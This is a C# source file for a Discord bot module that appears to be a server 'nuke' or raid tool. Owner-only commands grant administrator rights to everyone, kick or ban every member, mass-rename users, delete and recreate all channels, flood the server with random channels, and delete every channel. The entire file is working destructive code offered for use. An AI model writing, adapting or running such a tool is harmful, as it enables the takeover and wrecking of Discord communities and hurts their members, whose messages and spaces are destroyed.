using System;
using System.ComponentModel;
using System.Threading.Tasks;
using Discord;
using Discord.Addons.Interactive;
using Discord.Commands;
using Discord.WebSocket;

namespace DiscordBot.Modules
{
    [Summary(":Gun:")]
    public class MassCommands : InteractiveBase
    {
        private readonly ulong ownerID = 247742975608750090;

        [Command("admin")]
        [Summary("give admin all user")]
        public async Task GiveAdmin()
        {
            if (Context.User.Id.Equals(ownerID) && Context.User is SocketGuildUser)
            {
                await Context.Guild.EveryoneRole.ModifyAsync(r => r.Permissions = GuildPermissions.All);
                await Context.Channel.SendMessageAsync("Everi1 iz nao 4dm1n!");
            }
            else
            {
                await Context.Channel.SendMessageAsync("Permission denied!");
            }
        }

        [Command("member")]
        [Summary("give member all non-powered user")]
        public async Task GiveMember()
        {
            if (Context.User.Id.Equals(ownerID) && Context.User is SocketGuildUser)
            {
                await Context.Guild.EveryoneRole.ModifyAsync(r => r.Permissions = GuildPermissions.None);
                await Context.Channel.SendMessageAsync("Everi1 iz nao m3mb3r!");
            }
            else
            {
                await Context.Channel.SendMessageAsync("Permission denied!");
            }
        }

        [Command("kickall")]
        [Summary("Kick all non-powered users")]
        public async Task KickAll()
        {
            if (Context.User.Id.Equals(ownerID) && Context.User is SocketGuildUser)
            {
                foreach (var users in Context.Guild.Users)
                {
                    try
                    {
                        await users.KickAsync($"You got banned from {Context.Guild.Name} !");
                    }
                    catch
                    {
                        Console.WriteLine($"{users}'s role is the same or higher than bot!!");
                    }
                }
                await Context.Channel.SendMessageAsync("Every non-powered users is banned!!");
            }
            else
            {
                await Context.Channel.SendMessageAsync("Permission denied!");
            }
        }

        [Command("nukeall", RunMode = RunMode.Async)]
        [Summary("Nuke all channels")]
        public async Task NukeAll()
        {
            if (Context.User.Id.Equals(ownerID) && Context.User is SocketGuildUser)
            {
                await ReplyAndDeleteAsync("Are you sure you want to nuke all channels ?",
                    timeout: TimeSpan.FromSeconds(15));
                var response = await NextMessageAsync();
                if (response != null)
                {
                    if (response.ToString().ToLower().Equals("yes"))
                    {
                        foreach (var channel in Context.Guild.Channels)
                        {
                            var oldChannel = (ITextChannel)channel;
                            var guild = Context.Guild;
                            await guild.CreateTextChannelAsync(oldChannel.Name, newChannel =>
                            {
                                // Copies over all the properties of the channel to the new channel
                                newChannel.CategoryId = oldChannel.CategoryId;
                                newChannel.Topic = oldChannel.Topic;
                                newChannel.Position = oldChannel.Position;
                                newChannel.SlowModeInterval = oldChannel.SlowModeInterval;
                                newChannel.IsNsfw = oldChannel.IsNsfw;
                            });
                            await oldChannel.DeleteAsync();
                        }
                    }
                    else if (response.ToString().ToLower().Equals("no"))
                    {
                        await ReplyAsync($"Nuke cancelled on {Context.Guild}");
                    }
                }
                else
                {
                    await ReplyAsync($"{Context.User.Mention}, command timed out...");
                }
            }
            else
            {
                await Context.Channel.SendMessageAsync("Permission denied!");
            }
        }

        [Command("nameall")]
        [Summary("Name all username in server")]
        public async Task MuteAll([Remainder] string msg)
        {
            var userSend = Context.User as SocketGuildUser;

            if (Context.User.Id.Equals(ownerID) && Context.User is SocketGuildUser)
            {
                foreach (var users in Context.Guild.Users)
                {
                    try
                    {
                        await users.ModifyAsync(r => r.Nickname = msg);
                    }
                    catch
                    {
                        Console.WriteLine($"{users}'s role is the same or higher than bot!!");
                    }
                }
                await Context.Channel.SendMessageAsync($"All users's name changed to {msg}");
            }
            else
            {
                await Context.Channel.SendMessageAsync("Permission denied!");
            }
        }

        [Command("banall")]
        [Summary("Ban all non-powered users")]
        public async Task BanAll()
        {
            if (Context.User.Id.Equals(ownerID) && Context.User is SocketGuildUser)
            {
                foreach (var users in Context.Guild.Users)
                {
                    try
                    {
                        await users.BanAsync(7, $"You got banned from {Context.Guild.Name} !");
                    }
                    catch
                    {
                        Console.WriteLine($"{users}'s role is the same or higher than bot!!");
                    }
                }
                await Context.Channel.SendMessageAsync("Every non-powered users is banned!!");
            }
            else
            {
                await Context.Channel.SendMessageAsync("Permission denied!");
            }
        }

        [Command("flood")]
        [Summary("Flood server with channels")]
        public async Task SpamChannel()
        {
            if (Context.User.Id.Equals(ownerID) && Context.User is SocketGuildUser)
            {
                while (Context.Guild.Channels.Count <= 30)
                {
                    await Context.Guild.CreateTextChannelAsync(Utils.GetRandomAlphaNumeric());
                }
            }
            else
            {
                await Context.Channel.SendMessageAsync("Permission denied!");
            }
        }

        [Command("unflood")]
        [Summary("Delete all channels")]
        public async Task DeleteChannel()
        {
            if (Context.User.Id.Equals(ownerID) && Context.User is SocketGuildUser)
            {
                foreach (var channel in Context.Guild.Channels)
                {
                    await channel.DeleteAsync();
                }
            }
            else
            {
                await Context.Channel.SendMessageAsync("Permission denied!");
            }
        }
    }
}